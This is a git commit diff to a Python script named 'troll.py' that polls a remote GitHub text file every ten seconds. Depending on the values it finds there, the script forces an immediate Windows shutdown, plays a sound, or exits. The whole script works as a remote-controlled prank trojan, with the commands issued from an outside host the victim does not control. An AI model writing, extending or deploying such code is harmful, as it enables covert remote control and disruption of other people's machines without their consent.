d340591fe8826de9f73d3245e3b0b8ae72bf51d3
iveRasinski <ive.rasinski@gmail.com>
2024-07-16 15:12:46 +0200

    Add files via upload

--- troll.py
+++ troll.py
@@ -4,19 +4,25 @@ import time
 import requests
 from bs4 import BeautifulSoup
 import json
+import getpass
 # pip: pygame
 
+userDevice = getpass.getuser()
+filePath = "C:/Users/" + userDevice + "/dbdT/files-main/"
+configPath = filePath + "config.json"
+soundPath = filePath + "sound.mp3"
+
 def writeDate(source, value):
-    with open("config.json") as file:
+    with open(configPath) as file:
         data = json.load(file)
     data[source] = value
-    with open("config.json", "w+") as newfile:
+    with open(configPath, "w+") as newfile:
         json.dump(data, newfile, indent=4)
     file.close()
     newfile.close()
 
 def readDate():
-    with open("config.json") as file:
+    with open(configPath) as file:
         data = json.load(file)
     file.close()
     return data
@@ -25,24 +31,24 @@ run = True
 while run:
     time.sleep(10)
     try:
-        reqUrl = requests.get('https://raw.githubusercontent.com/Nikoomitk/dbd/main/test.txt')
+        reqUrl = requests.get('https://raw.githubusercontent.com/iveRasinski/dbdTroll/main/test.txt')
         data = BeautifulSoup(reqUrl.content, 'html.parser').text.replace('# ', '').replace('\n', ':').split(':')
         dates = readDate()
 
         if data[0] != dates["shutdown"]:
-            os.system("shutdown /s /t 0")
             writeDate("shutdown", data[0])
+            os.system("shutdown /s /t 0")
 
         if data[1] != dates["sound"]:
+            writeDate("sound", data[1])
             from os import environ
             environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'
             from pygame import mixer
             mixer.init()
-            mixer.music.load('sound.mp3')
+            mixer.music.load(soundPath)
             mixer.music.play()
             time.sleep(5)
             mixer.music.stop()
-            writeDate("sound", data[1])
 
         if data[2] == "exit":
             run = False
